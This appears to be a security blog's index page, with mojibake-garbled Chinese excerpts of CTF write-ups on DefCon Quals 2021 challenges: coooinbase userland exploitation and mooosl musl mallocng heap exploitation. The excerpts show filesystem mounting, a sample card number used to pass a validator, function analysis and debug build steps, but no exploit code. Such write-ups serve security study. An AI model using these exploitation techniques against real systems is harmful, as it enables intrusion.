			<a href="/2021/06/26/PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç”¨æˆ·æ€åˆ©ç”¨/" title="DefCon Quals 2021 coooinbaseçš„è§£é¢˜æ€è·¯">PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç”¨æˆ·æ€åˆ©ç”¨</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-06-26  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š<a href="https://www.anquanke.com/post/id/242112" target="_blank" rel="noopener">PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç”¨æˆ·æ€åˆ©ç”¨</a></p>
<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326290561-1621326290590.png" alt="title"><br>é¢˜ç›®æ¥æºäºDefCon Quals 2021çš„coooinbaseäºŒè¿pwnï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯ç”¨æˆ·ç©ºé—´åˆ©ç”¨ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯å†…æ ¸åˆ©ç”¨ã€‚æœ¬ç¯‡æ–‡ç« æ˜¯coooinbaseç”¨æˆ·æ€pwnçš„è§£é¢˜æ€è·¯ã€‚</p>
<p>åœ¨Githubä¸Šæ‰¾åˆ°å¯¹åº”æºç <br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326380004-1621326380005.png" alt="title"></p>
<p>è¿™æ˜¯ä¸€æ¬¾æå…¶ç²¾ç®€çš„çš„OSï¼Œæ²¡æœ‰shellï¼Œç”šè‡³åªå®ç°äº†æœ‰é™çš„å‡ ä¸ªç³»ç»Ÿè°ƒç”¨ï¼ŒåŒ…æ‹¬openã€readã€writeç­‰ã€‚åœ¨<code>coooinbase.bin</code>è¿™ä¸ªå†…æ ¸åŸºç¡€ä¸Šï¼Œå†è·‘ç€ä¸€ä¸ªç”¨æˆ·æ€è¿›ç¨‹<code>run</code>ï¼Œä»¥ä¸‹æ˜¯å…³äº<code>run</code>è¿™ä¸ªç”¨æˆ·æ€è¿›ç¨‹çš„pwn<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326468550-1621326468553.png" alt="title"></p>
<h1 id="Rubyæºç å®¡è®¡"><a href="#Rubyæºç å®¡è®¡" class="headerlink" title="Rubyæºç å®¡è®¡"></a>Rubyæºç å®¡è®¡</h1><p>ç»™äº†ä»¥ä¸‹å‡ ä¸ªæ–‡ä»¶ï¼Œæ‰§è¡Œ<code>ruby x.rb</code>å¯åŠ¨é¢˜ç›®ç¯å¢ƒ<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621329312675-1621329312678.png" alt="title"></p>
<p>è§£å‹æ–‡ä»¶ç³»ç»Ÿ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/dos</span><br><span class="line">sudo mount -o loop ./rootfs.img /tmp/dos</span><br><span class="line">file /tmp/dos/bin</span><br><span class="line">/tmp/dos/bin: PDP-11 kernel overlay</span><br><span class="line">cat /tmp/dos/flg</span><br><span class="line">OOO&#123;this_is_from_userland&#125;</span><br></pre></td></tr></table></figure>

<p>x.rbï¼Œä¼šå¯¹è¾“å…¥çš„<code>credit_card</code>è¿›è¡Œæ ¡éªŒï¼Œçœ‹ä¸‹æ˜¯å¦validï¼Œå¯ç”¨<code>4485-7873-4804-0088</code>é€šè¿‡æ£€æŸ¥<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/21/1621584844106-1621584844111.png" alt="title"></p>
<p>é€šè¿‡POSTæ–¹æ³•<code>/gen-bson</code>è·å–<code>cvv</code>ã€<code>expmonth</code>ã€<code>expyear</code>ã€<code>cardnumber</code>å‚æ•°ï¼Œåºåˆ—åŒ–æˆbsonæ•°æ®ï¼Œæœ€åè½¬æˆbase64ã€‚ä½†æ˜¯ï¼Œbsonåªèƒ½æ¥å—<code>0x0~0x7f</code>çš„utf-8æ•°æ®ï¼Œè¶…å‡ºè¿™ä¸ªèŒƒå›´çš„byteæ•°æ®ä¼šå¯¼è‡´æ²¡æ³•é€šè¿‡x.rbçš„checkï¼Œè¿™ä¸ºåç»­æ„é€ ropå¸¦æ¥å›°éš¾ã€‚<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/21/1621585746598-1621585746599.png" alt="title"></p>
	

	</div>
  <a type="button" href="/2021/06/26/PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç”¨æˆ·æ€åˆ©ç”¨/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š<a href="https://www.anquanke.com/post/id/242112" target="_blank" rel="noopener">PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç”¨æˆ·æ€åˆ©ç”¨</a></p>
<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326290561-1621326290590.png" alt="title"><br>é¢˜ç›®æ¥æºäºDefCon Quals 2021çš„coooinbaseäºŒè¿pwnï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯ç”¨æˆ·ç©ºé—´åˆ©ç”¨ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯å†…æ ¸åˆ©ç”¨ã€‚æœ¬ç¯‡æ–‡ç« æ˜¯coooinbaseç”¨æˆ·æ€pwnçš„è§£é¢˜æ€è·¯ã€‚</p>
<p>åœ¨Githubä¸Šæ‰¾åˆ°å¯¹åº”æºç <br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326380004-1621326380005.png" alt="title"></p>
<p>è¿™æ˜¯ä¸€æ¬¾æå…¶ç²¾ç®€çš„çš„OSï¼Œæ²¡æœ‰shellï¼Œç”šè‡³åªå®ç°äº†æœ‰é™çš„å‡ ä¸ªç³»ç»Ÿè°ƒç”¨ï¼ŒåŒ…æ‹¬openã€readã€writeç­‰ã€‚åœ¨<code>coooinbase.bin</code>è¿™ä¸ªå†…æ ¸åŸºç¡€ä¸Šï¼Œå†è·‘ç€ä¸€ä¸ªç”¨æˆ·æ€è¿›ç¨‹<code>run</code>ï¼Œä»¥ä¸‹æ˜¯å…³äº<code>run</code>è¿™ä¸ªç”¨æˆ·æ€è¿›ç¨‹çš„pwn<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326468550-1621326468553.png" alt="title"></p>
<h1 id="Rubyæºç å®¡è®¡"><a href="#Rubyæºç å®¡è®¡" class="headerlink" title="Rubyæºç å®¡è®¡"></a>Rubyæºç å®¡è®¡</h1><p>ç»™äº†ä»¥ä¸‹å‡ ä¸ªæ–‡ä»¶ï¼Œæ‰§è¡Œ<code>ruby x.rb</code>å¯åŠ¨é¢˜ç›®ç¯å¢ƒ<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621329312675-1621329312678.png" alt="title"></p>
<p>è§£å‹æ–‡ä»¶ç³»ç»Ÿ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/dos</span><br><span class="line">sudo mount -o loop ./rootfs.img /tmp/dos</span><br><span class="line">file /tmp/dos/bin</span><br><span class="line">/tmp/dos/bin: PDP-11 kernel overlay</span><br><span class="line">cat /tmp/dos/flg</span><br><span class="line">OOO&#123;this_is_from_userland&#125;</span><br></pre></td></tr></table></figure>

<p>x.rbï¼Œä¼šå¯¹è¾“å…¥çš„<code>credit_card</code>è¿›è¡Œæ ¡éªŒï¼Œçœ‹ä¸‹æ˜¯å¦validï¼Œå¯ç”¨<code>4485-7873-4804-0088</code>é€šè¿‡æ£€æŸ¥<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/21/1621584844106-1621584844111.png" alt="title"></p>
<p>é€šè¿‡POSTæ–¹æ³•<code>/gen-bson</code>è·å–<code>cvv</code>ã€<code>expmonth</code>ã€<code>expyear</code>ã€<code>cardnumber</code>å‚æ•°ï¼Œåºåˆ—åŒ–æˆbsonæ•°æ®ï¼Œæœ€åè½¬æˆbase64ã€‚ä½†æ˜¯ï¼Œbsonåªèƒ½æ¥å—<code>0x0~0x7f</code>çš„utf-8æ•°æ®ï¼Œè¶…å‡ºè¿™ä¸ªèŒƒå›´çš„byteæ•°æ®ä¼šå¯¼è‡´æ²¡æ³•é€šè¿‡x.rbçš„checkï¼Œè¿™ä¸ºåç»­æ„é€ ropå¸¦æ¥å›°éš¾ã€‚<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/21/1621585746598-1621585746599.png" alt="title"></p>
	
	</div>
  <a type="button" href="/2021/06/26/PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç”¨æˆ·æ€åˆ©ç”¨/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/06/26/å€ŸåŠ©DefCon-Quals-2021çš„moooslå­¦ä¹ musl-mallocngï¼ˆæ¼æ´åˆ©ç”¨ç¯‡ï¼‰/" title="DefCon Quals 2021 moooslçš„è§£é¢˜æ€è·¯">å€ŸåŠ©DefCon Quals 2021çš„moooslå­¦ä¹ musl mallocngï¼ˆæ¼æ´åˆ©ç”¨ç¯‡ï¼‰</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-06-26  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š<a href="https://www.anquanke.com/post/id/241104" target="_blank" rel="noopener">å€ŸåŠ©DefCon Quals 2021çš„moooslå­¦ä¹ musl mallocngï¼ˆæ¼æ´åˆ©ç”¨ç¯‡ï¼‰</a></p>
<p>ä¸Šç¯‡æˆ‘ä»¬å¤§è‡´è¿‡äº†ä¸€émusl libc 1.2.2çš„mallocngæºç ï¼Œäº†è§£åˆ°muslå †ç®¡ç†å™¨ç”¨ä»¥ä¸‹çš„ç»“æ„ç®¡ç†ç€metaã€groupä»¥åŠchunkã€‚æœ¬ç¯‡æˆ‘ä»¬ç»§ç»­æ¥åˆ†æmoooslè¿™é“é¢˜çš„è§£é¢˜æ€è·¯ã€‚<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/13/1620877156490-1620877156490.png" alt="title"></p>
<h1 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h1><p>ä¿æŠ¤å…¨å¼€<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620961337503-1620961337534.png" alt="title"></p>
<p>ç¨‹åºä¸»è¦æä¾›äº†<code>store</code>ã€<code>query</code>ã€<code>delete</code>è¿™å‡ ä¸ªåŠŸèƒ½ï¼Œä¸‹é¢é€ä¸ªåŠŸèƒ½è¿›è¡Œåˆ†æ<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620961459130-1620961459131.png" alt="title"></p>
<p>sotreï¼Œç”³è¯·0x30çš„chunkï¼Œç”¨äºå­˜æ”¾keyã€valueä»¥åŠå¯¹åº”çš„sizeï¼Œå¦å¤–è¿˜ä¼šç®—å‡ºhashå’Œprev_hash_mapï¼ˆä¿å­˜ç€hash_mapå…ˆå‰åœ¨è¯¥å¤„çš„æŒ‡é’ˆï¼‰<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973183066-1620973183067.png" alt="title"></p>
<p>set_keyå’Œset_valueï¼Œæ¯”è¾ƒç±»ä¼¼ï¼Œæ ¹æ®è¾“å…¥çš„sizeå»ç”³è¯·chunkï¼Œç„¶åå¡«å…¥keyå’Œvalueï¼Œæ‰€ä»¥storeæ–¹æ³•ä¸€å…±ä¼šç”³è¯·3ä¸ªchunk<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620962248015-1620962248017.png" alt="title"></p>
<p>get_hashï¼Œè¿”å›ä¸€ä¸ªhashå€¼ï¼Œè¿”å›ååªå–ä½12ä½ï¼Œæ ¹æ®è¿™ä¸ªhashå¾—åˆ°hash_map[hash&amp;0xfff]ï¼Œå…ˆå°†hash_map[hash&amp;0xfff]åŸæœ‰çš„å€¼ä¿å­˜åœ¨prev_hash_mapï¼Œç„¶åå°†0x30 chunkçš„åœ°å€å­˜å…¥hash_map[hash&amp;0xfff]<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973758763-1620973758765.png" alt="title"></p>
<p>queryï¼ŒæŸ¥è¯¢åŠŸèƒ½ï¼Œæ ¹æ®è¾“å…¥çš„keyï¼Œæ‰¾åˆ°å¯¹åº”çš„valueå¹¶ä»¥hexå­—ç¬¦ä¸²å½¢å¼è¾“å‡ºã€‚æ³¨æ„åˆ°è¿™é‡Œè°ƒäº†set_keyï¼Œä¼šå…ˆç”³è¯·chunkç”¨äºå­˜æ”¾keyï¼Œæœ€åå†freeæ‰ã€‚<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973813101-1620973813103.png" alt="title"></p>
<p>æŸ¥æ‰¾è¿‡ç¨‹æ˜¯éå†hash_mapæ‰¾åˆ°å¯¹åº”keyï¼Œå¦‚æœprev_hash_mapä¸ä¸ºé›¶ï¼Œåˆ™ä¼šæ‰“å°å‡ºprev_hash_mapçš„æ•°æ®<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620979440795-1620979440796.png" alt="title"></p>
	

	</div>
  <a type="button" href="/2021/06/26/å€ŸåŠ©DefCon-Quals-2021çš„moooslå­¦ä¹ musl-mallocngï¼ˆæ¼æ´åˆ©ç”¨ç¯‡ï¼‰/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š<a href="https://www.anquanke.com/post/id/241104" target="_blank" rel="noopener">å€ŸåŠ©DefCon Quals 2021çš„moooslå­¦ä¹ musl mallocngï¼ˆæ¼æ´åˆ©ç”¨ç¯‡ï¼‰</a></p>
<p>ä¸Šç¯‡æˆ‘ä»¬å¤§è‡´è¿‡äº†ä¸€émusl libc 1.2.2çš„mallocngæºç ï¼Œäº†è§£åˆ°muslå †ç®¡ç†å™¨ç”¨ä»¥ä¸‹çš„ç»“æ„ç®¡ç†ç€metaã€groupä»¥åŠchunkã€‚æœ¬ç¯‡æˆ‘ä»¬ç»§ç»­æ¥åˆ†æmoooslè¿™é“é¢˜çš„è§£é¢˜æ€è·¯ã€‚<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/13/1620877156490-1620877156490.png" alt="title"></p>
<h1 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h1><p>ä¿æŠ¤å…¨å¼€<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620961337503-1620961337534.png" alt="title"></p>
<p>ç¨‹åºä¸»è¦æä¾›äº†<code>store</code>ã€<code>query</code>ã€<code>delete</code>è¿™å‡ ä¸ªåŠŸèƒ½ï¼Œä¸‹é¢é€ä¸ªåŠŸèƒ½è¿›è¡Œåˆ†æ<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620961459130-1620961459131.png" alt="title"></p>
<p>sotreï¼Œç”³è¯·0x30çš„chunkï¼Œç”¨äºå­˜æ”¾keyã€valueä»¥åŠå¯¹åº”çš„sizeï¼Œå¦å¤–è¿˜ä¼šç®—å‡ºhashå’Œprev_hash_mapï¼ˆä¿å­˜ç€hash_mapå…ˆå‰åœ¨è¯¥å¤„çš„æŒ‡é’ˆï¼‰<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973183066-1620973183067.png" alt="title"></p>
<p>set_keyå’Œset_valueï¼Œæ¯”è¾ƒç±»ä¼¼ï¼Œæ ¹æ®è¾“å…¥çš„sizeå»ç”³è¯·chunkï¼Œç„¶åå¡«å…¥keyå’Œvalueï¼Œæ‰€ä»¥storeæ–¹æ³•ä¸€å…±ä¼šç”³è¯·3ä¸ªchunk<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620962248015-1620962248017.png" alt="title"></p>
<p>get_hashï¼Œè¿”å›ä¸€ä¸ªhashå€¼ï¼Œè¿”å›ååªå–ä½12ä½ï¼Œæ ¹æ®è¿™ä¸ªhashå¾—åˆ°hash_map[hash&amp;0xfff]ï¼Œå…ˆå°†hash_map[hash&amp;0xfff]åŸæœ‰çš„å€¼ä¿å­˜åœ¨prev_hash_mapï¼Œç„¶åå°†0x30 chunkçš„åœ°å€å­˜å…¥hash_map[hash&amp;0xfff]<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973758763-1620973758765.png" alt="title"></p>
<p>queryï¼ŒæŸ¥è¯¢åŠŸèƒ½ï¼Œæ ¹æ®è¾“å…¥çš„keyï¼Œæ‰¾åˆ°å¯¹åº”çš„valueå¹¶ä»¥hexå­—ç¬¦ä¸²å½¢å¼è¾“å‡ºã€‚æ³¨æ„åˆ°è¿™é‡Œè°ƒäº†set_keyï¼Œä¼šå…ˆç”³è¯·chunkç”¨äºå­˜æ”¾keyï¼Œæœ€åå†freeæ‰ã€‚<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973813101-1620973813103.png" alt="title"></p>
<p>æŸ¥æ‰¾è¿‡ç¨‹æ˜¯éå†hash_mapæ‰¾åˆ°å¯¹åº”keyï¼Œå¦‚æœprev_hash_mapä¸ä¸ºé›¶ï¼Œåˆ™ä¼šæ‰“å°å‡ºprev_hash_mapçš„æ•°æ®<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620979440795-1620979440796.png" alt="title"></p>
	
	</div>
  <a type="button" href="/2021/06/26/å€ŸåŠ©DefCon-Quals-2021çš„moooslå­¦ä¹ musl-mallocngï¼ˆæ¼æ´åˆ©ç”¨ç¯‡ï¼‰/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/31/å€ŸåŠ©DefCon-Quals-2021çš„moooslå­¦ä¹ musl-mallocngï¼ˆæºç å®¡è®¡ç¯‡ï¼‰/" title="DefCon Quals 2021 moooslçš„è§£é¢˜æ€è·¯">å€ŸåŠ©DefCon Quals 2021çš„moooslå­¦ä¹ musl mallocngï¼ˆæºç å®¡è®¡ç¯‡ï¼‰</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-31  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š<a href="https://www.anquanke.com/post/id/241101" target="_blank" rel="noopener">å€ŸåŠ©DefCon Quals 2021çš„moooslå­¦ä¹ musl mallocngï¼ˆæºç å®¡è®¡ç¯‡ï¼‰</a></p>
<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/13/1620880732619-1620880732620.png" alt="title"><br>æœ¬é¢˜æ¥æºäºDefCon Quals 2021çš„moooslï¼Œè€ƒå¯Ÿç‚¹æ˜¯æœ€æ–°ç‰ˆæœ¬musl libc 1.2.2åˆ©ç”¨ã€‚</p>
<p>å…³äºmusl libcçš„èµ„æ–™æ¯”èµ›æœŸé—´æ‰¾åˆ°è¿‡ä¸€ç¯‡<a href="https://www.anquanke.com/post/id/202253#h3-15" target="_blank" rel="noopener">ä»ä¸€æ¬¡ CTF å‡ºé¢˜è°ˆ musl libc å †æ¼æ´åˆ©ç”¨</a>ï¼Œç¢äºmusl libcåœ¨1.2.xä¹‹åçš„å †ç®¡ç†æœºåˆ¶æœ‰è¾ƒå¤§çš„æ”¹ç‰ˆï¼Œå› è€Œæœ‰äº†è¯¥æ–‡ç« ã€‚æœ¬æ¬¡æ–‡ç« åˆ†ä¸Šä¸‹ä¸¤ç¯‡ï¼Œä»musl libc 1.2.2çš„æºç å®¡è®¡ã€è°ƒè¯•ï¼Œä»¥åŠå…¶ä¸­çš„åˆ©ç”¨æœºä¼šï¼Œå†åˆ°moooslè¿™é“é¢˜çš„è§£é¢˜è¿‡ç¨‹åšä¸€ä¸ªåˆ†æã€‚</p>
<p>musl libc 1.2.2çš„æºç å¯ä»¥ä»<a href="https://musl.libc.org/releases/musl-1.2.2.tar.gz" target="_blank" rel="noopener">æ­¤å¤„</a>ä¸‹è½½è·å¾—ã€‚1.2.xé‡‡ç”¨<code>src/malloc/mallocng</code>å†…çš„ä»£ç ï¼Œå…¶å †ç®¡ç†ç»“æ„ä¸æ—©æœŸç‰ˆæœ¬å‡ ä¹å®Œå…¨ä¸åŒï¼Œè€Œæ—©æœŸçš„å †ç®¡ç†å™¨åˆ™æ”¾å…¥äº†<code>src/malloc/oldmalloc</code>ä¸­ã€‚<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/13/1620880937953-1620880937955.png" alt="title"></p>
<h1 id="è°ƒè¯•å¸¦ç¬¦å·çš„musl-libc"><a href="#è°ƒè¯•å¸¦ç¬¦å·çš„musl-libc" class="headerlink" title="è°ƒè¯•å¸¦ç¬¦å·çš„musl libc"></a>è°ƒè¯•å¸¦ç¬¦å·çš„musl libc</h1><h2 id="0x01æºç ç¼–è¯‘"><a href="#0x01æºç ç¼–è¯‘" class="headerlink" title="0x01æºç ç¼–è¯‘"></a>0x01æºç ç¼–è¯‘</h2><p>é¢˜ç›®æä¾›çš„libc.soä¸å¸¦ç¬¦å·ï¼Œå¾ˆéš¾é€šè¿‡è°ƒè¯•å»ç†è§£muslå †ç®¡ç†å™¨çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥é€šè¿‡æºç ç¼–è¯‘ï¼Œç”Ÿæˆä¸€ä»½å¸¦è°ƒè¯•ç¬¦å·çš„libc.soï¼Œè¿›è¡Œæºç çº§debugã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf .&#x2F;musl-1.2.2.tar.gz</span><br><span class="line">cd musl-1.2.2</span><br><span class="line">mkdir build x64</span><br><span class="line">cd build</span><br><span class="line"></span><br><span class="line">CC&#x3D;&quot;gcc&quot; CXX&#x3D;&quot;g++&quot; \             </span><br><span class="line">    CFLAGS&#x3D;&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -fno-stack-protector&quot; \</span><br><span class="line">    CXXFLAGS&#x3D;&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -fno-stack-protector&quot; \</span><br><span class="line">    ..&#x2F;configure --prefix&#x3D;&#x2F;home&#x2F;sung3r&#x2F;workspace&#x2F;sharefd&#x2F;glibc&#x2F;glibc-2.32&#x2F;x64 --disable-werror</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>/src/x64/</code>ä¸‹æ‰¾åˆ°ç¼–è¯‘å¥½çš„libc.so</p>
<p>é€šè¿‡patchelfå°†ld.soæ”¹æˆlibc.soå³å¯ï¼Œgdbè°ƒè¯•æ—¶åŠ ä¸Š<code>dir /path/to/musl-1.2.2/src/malloc/</code>å’Œ<code>dir /path/to/musl-1.2.2/src/malloc/mallocng</code>ä¾¿å¯æºç è°ƒè¯•ã€‚</p>
	

	</div>
  <a type="button" href="/2021/05/31/å€ŸåŠ©DefCon-Quals-2021çš„moooslå­¦ä¹ musl-mallocngï¼ˆæºç å®¡è®¡ç¯‡ï¼‰/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š<a href="https://www.anquanke.com/post/id/241101" target="_blank" rel="noopener">å€ŸåŠ©DefCon Quals 2021çš„moooslå­¦ä¹ musl mallocngï¼ˆæºç å®¡è®¡ç¯‡ï¼‰</a></p>
<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/13/1620880732619-1620880732620.png" alt="title"><br>æœ¬é¢˜æ¥æºäºDefCon Quals 2021çš„moooslï¼Œè€ƒå¯Ÿç‚¹æ˜¯æœ€æ–°ç‰ˆæœ¬musl libc 1.2.2åˆ©ç”¨ã€‚</p>
<p>å…³äºmusl libcçš„èµ„æ–™æ¯”èµ›æœŸé—´æ‰¾åˆ°è¿‡ä¸€ç¯‡<a href="https://www.anquanke.com/post/id/202253#h3-15" target="_blank" rel="noopener">ä»ä¸€æ¬¡ CTF å‡ºé¢˜è°ˆ musl libc å †æ¼æ´åˆ©ç”¨</a>ï¼Œç¢äºmusl libcåœ¨1.2.xä¹‹åçš„å †ç®¡ç†æœºåˆ¶æœ‰è¾ƒå¤§çš„æ”¹ç‰ˆï¼Œå› è€Œæœ‰äº†è¯¥æ–‡ç« ã€‚æœ¬æ¬¡æ–‡ç« åˆ†ä¸Šä¸‹ä¸¤ç¯‡ï¼Œä»musl libc 1.2.2çš„æºç å®¡è®¡ã€è°ƒè¯•ï¼Œä»¥åŠå…¶ä¸­çš„åˆ©ç”¨æœºä¼šï¼Œå†åˆ°moooslè¿™é“é¢˜çš„è§£é¢˜è¿‡ç¨‹åšä¸€ä¸ªåˆ†æã€‚</p>
<p>musl libc 1.2.2çš„æºç å¯ä»¥ä»<a href="https://musl.libc.org/releases/musl-1.2.2.tar.gz" target="_blank" rel="noopener">æ­¤å¤„</a>ä¸‹è½½è·å¾—ã€‚1.2.xé‡‡ç”¨<code>src/malloc/mallocng</code>å†…çš„ä»£ç ï¼Œå…¶å †ç®¡ç†ç»“æ„ä¸æ—©æœŸç‰ˆæœ¬å‡ ä¹å®Œå…¨ä¸åŒï¼Œè€Œæ—©æœŸçš„å †ç®¡ç†å™¨åˆ™æ”¾å…¥äº†<code>src/malloc/oldmalloc</code>ä¸­ã€‚<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/13/1620880937953-1620880937955.png" alt="title"></p>
<h1 id="è°ƒè¯•å¸¦ç¬¦å·çš„musl-libc"><a href="#è°ƒè¯•å¸¦ç¬¦å·çš„musl-libc" class="headerlink" title="è°ƒè¯•å¸¦ç¬¦å·çš„musl libc"></a>è°ƒè¯•å¸¦ç¬¦å·çš„musl libc</h1><h2 id="0x01æºç ç¼–è¯‘"><a href="#0x01æºç ç¼–è¯‘" class="headerlink" title="0x01æºç ç¼–è¯‘"></a>0x01æºç ç¼–è¯‘</h2><p>é¢˜ç›®æä¾›çš„libc.soä¸å¸¦ç¬¦å·ï¼Œå¾ˆéš¾é€šè¿‡è°ƒè¯•å»ç†è§£muslå †ç®¡ç†å™¨çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥é€šè¿‡æºç ç¼–è¯‘ï¼Œç”Ÿæˆä¸€ä»½å¸¦è°ƒè¯•ç¬¦å·çš„libc.soï¼Œè¿›è¡Œæºç çº§debugã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf .&#x2F;musl-1.2.2.tar.gz</span><br><span class="line">cd musl-1.2.2</span><br><span class="line">mkdir build x64</span><br><span class="line">cd build</span><br><span class="line"></span><br><span class="line">CC&#x3D;&quot;gcc&quot; CXX&#x3D;&quot;g++&quot; \             </span><br><span class="line">    CFLAGS&#x3D;&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -fno-stack-protector&quot; \</span><br><span class="line">    CXXFLAGS&#x3D;&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -fno-stack-protector&quot; \</span><br><span class="line">    ..&#x2F;configure --prefix&#x3D;&#x2F;home&#x2F;sung3r&#x2F;workspace&#x2F;sharefd&#x2F;glibc&#x2F;glibc-2.32&#x2F;x64 --disable-werror</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
